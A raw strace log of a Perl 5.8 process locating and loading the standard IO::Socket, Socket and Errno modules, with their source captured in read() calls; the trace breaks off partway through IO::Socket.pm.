18439 12:54:35.889183 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.889196 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
18439 12:54:35.889217 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 7
18439 12:54:35.889233 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff781e8) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.889244 _llseek(7, 0, [0], SEEK_CUR) = 0
18439 12:54:35.889262 read(7, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
18439 12:54:35.889585 stat64("/etc/perl/Socket.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.889601 stat64("/etc/perl/Socket.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.889623 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.889665 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.889697 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.889710 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.889724 stat64("/usr/lib/perl5/Socket.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.889736 stat64("/usr/lib/perl5/Socket.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.889749 stat64("/usr/share/perl5/Socket.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.889761 stat64("/usr/share/perl5/Socket.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.889774 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.889787 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
18439 12:54:35.889808 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 9
18439 12:54:35.889822 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff77d38) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.889833 _llseek(9, 0, [0], SEEK_CUR) = 0
18439 12:54:35.889851 read(9, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
18439 12:54:35.890253 brk(0x8239000)    = 0x8239000
18439 12:54:35.890462 read(9, "", 4096) = 0
18439 12:54:35.897178 close(9)          = 0
18439 12:54:35.897329 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
18439 12:54:35.897380 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
18439 12:54:35.897423 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 9
18439 12:54:35.897449 read(9, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
18439 12:54:35.897548 fstat64(9, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
18439 12:54:35.897567 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 9, 0) = 0xb7d66000
18439 12:54:35.897581 mmap2(0xb7d6b000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 9, 0x4) = 0xb7d6b000
18439 12:54:35.897597 close(9)          = 0
18439 12:54:35.898270 brk(0x825a000)    = 0x825a000
18439 12:54:35.898428 stat64("/etc/perl/Errno.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.898445 stat64("/etc/perl/Errno.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.898460 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.898472 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.898487 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.898499 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.898514 stat64("/usr/lib/perl5/Errno.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.898526 stat64("/usr/lib/perl5/Errno.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.898539 stat64("/usr/share/perl5/Errno.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.898551 stat64("/usr/share/perl5/Errno.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.898565 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.898577 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
18439 12:54:35.898598 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 9
18439 12:54:35.898613 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff77d38) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.898625 _llseek(9, 0, [0], SEEK_CUR) = 0
18439 12:54:35.898671 read(9, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
18439 12:54:35.899436 read(9, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
18439 12:54:35.899878 _llseek(9, 5966, [5966], SEEK_SET) = 0
18439 12:54:35.899895 _llseek(9, 0, [5966], SEEK_CUR) = 0
18439 12:54:35.899906 close(9)          = 0
18439 12:54:35.900269 brk(0x827b000)    = 0x827b000
18439 12:54:35.900399 read(7, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    